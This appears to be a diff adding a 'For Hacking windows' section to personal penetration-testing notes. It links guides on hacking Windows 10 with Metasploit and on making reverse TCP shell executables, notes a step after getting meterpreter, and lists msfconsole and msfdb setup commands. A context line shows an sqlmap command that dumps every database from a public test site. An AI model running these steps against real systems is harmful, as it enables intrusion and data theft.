@@ -245,3 +245,13 @@ Wordpress
 	sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D databasename --dump-all --batch
 
 	
+7. For Hacking windows
+https://sploitech.com/exploiting-tools/how-to-hack-windows-10-using-metasploit-and-kali-linux/
+https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047
+after getting meterpreter cd :\
+
+
+start msfconsole
+sudo msfdb init
+sudo msfdb start
+sudo msfdb status
